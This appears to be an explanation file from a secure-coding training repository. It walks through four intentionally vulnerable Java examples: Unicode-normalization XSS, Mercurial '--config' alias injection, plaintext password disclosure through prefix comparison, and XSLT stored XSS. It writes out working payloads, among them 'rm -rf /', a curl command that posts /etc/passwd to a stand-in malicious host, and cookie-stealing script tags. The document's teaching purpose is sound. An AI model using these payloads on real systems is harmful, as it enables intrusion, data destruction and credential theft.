# Contents

- [StoredXSS.java](#storedxssjava)
- [ParameterInjection.java](#parameterinjectionjava)
- [InformationDisclosure.java](#informationdisclosurejava)
- [StoredXSS_XSLT.java](#storedxss_xsltjava)

&nbsp;


## [StoredXSS.java](../../examples/insecure/java/StoredXSS.java)
Path: `examples/insecure/java/StoredXSS.java`

### Explanation
The application is monolithic and uses server-side rendering.
It fetches user comments from the backend, as we can see on line 7.
On line 9, it appears that the backend is encoding certain characters: `<` becomes `&lt;`, and `>` becomes `&gt;`.

The issue arises on line 10. While the context provided by the backend seems safe, the encoded data is passed to the Normalizer class after encoding. Essentially, the already-encoded data gets decoded. This results in the unwanted behavior of decoding the characters that should have remained encoded.

The Normalizer class likely normalizes Unicode characters, as the backend normalizes smaller or larger characters. Given this, it's reasonable to assume that the normalizer could be normalizing Unicode characters as well.

As a result, it's highly likely that a Unicode-based XSS payload will work here. For example:  
```bash
{'comment':'\ufe64script\ufe65alert(document.domain);\ufe64/script\ufe65'}
```


&nbsp;


## [ParameterInjection.java](../../examples/insecure/java/ParameterInjection.java)
Path: `examples/insecure/java/ParameterInjection.java`

### Explanation

This Java example demonstrates a **Parameter Injection vulnerability** in a Mercurial (hg) integration. The code attempts to prevent command injection through blacklisting but fails to secure the `--config` parameter, allowing arbitrary command execution.

**Insecure Blacklist Approach (Lines 8-9):**
   - Only blocks basic command injection attempts using `$(` and `backticks`
   - Does not address parameter-based attacks

#### Blocked Command Injection Attempt
```bash
hg identify http://example.com/$(id)   # Prevented by blacklist
hg identify http://example.com/`id`    # Prevented by blacklist
```

**Unsanitized Command Execution:**
- Directly incorporates user input into system commands.
- Critical Parameter in Mercurial (hg): --config allows overriding commands.

#### Parameter Injection
```bash
hg identify --config=alias.identify=!id
```
- **Mechanism:**
  1. Overrides the `identify` command alias via `--config`
  2. `!id` executes system commands through Mercurial's alias functionality
  3. Full command execution chain:
     ```
     hg → config parser → shell execution
     ```

**Attackers can execute:**
  ```bash
hg identify --config=alias.identify='!rm -rf /'  # Destructive commands
hg identify --config=alias.identify='!curl -X POST -d @/etc/passwd http://malicious.site' # Data exfiltration
  ```


&nbsp;

## [InformationDisclosure.java](../../examples/insecure/java/InformationDisclosure.java)

Path: `examples/insecure/java/InformationDisclosure.java`

### Explanation

The `/register` endpoint compares new user passwords against existing ones character by character.  
At **line 20**, the application checks if the new password **starts with** any existing password:

### **Issue:**
  - The application stores passwords **in plaintext** instead of hashing them. This makes direct comparisons possible, leading to **password disclosure.**
  - The use of `startsWith()` allows an attacker to **brute-force** the stored passwords **character by character.**

#### **Guessing Password Characters**
The attacker submits incremental passwords via the registration form:

1. `password=a` → No error → No password starts with "a"
2. `password=b` → **403 Error** → At least one password starts with "b"
3. `password=ba` → No error → The password does **not** continue with "ba"
4. `password=bb` → **403 Error** → The password starts with "bb"

#### **Extracting the Entire Password**
Repeating this process for each character reveals the complete password:

```markdown
Stored Password: "secret123"
Attacker's Attempts:
1. "s" → 403 (Correct first character)
2. "se" → 403 (Correct first two characters)
3. "sec" → 403
...
7. "secret12" → 403
8. "secret123" → Registration successful (Full password recovered)
```

&nbsp;

## [StoredXSS_XSLT.java](../../examples/insecure/java/StoredXSS_XSLT.java)

Path: `examples/insecure/java/StoredXSS_XSLT.java`

### Explanation

At line 52, the `comment.xslt` template converts user comments into HTML but **only validates the `href` attribute**, without restricting **the tag itself**.

**Issue:**  
  An attacker can inject a malicious tag like `<script>` with an `href` attribute, and XSLT **inserts it into the HTML without filtering**.

**Exploitation: Stored XSS via Malicious Comment**

```markdown
POST /comment HTTP/1.1
...
<script href="/">alert(document.cookie);</script>
```
 The `<script>` tag is processed by XSLT and inserted into the page.
 When a user visits the comments section, the `<script>` tag executes.
 **Impact:** The attacker's script runs, stealing cookies or performing further actions.


 &nbsp;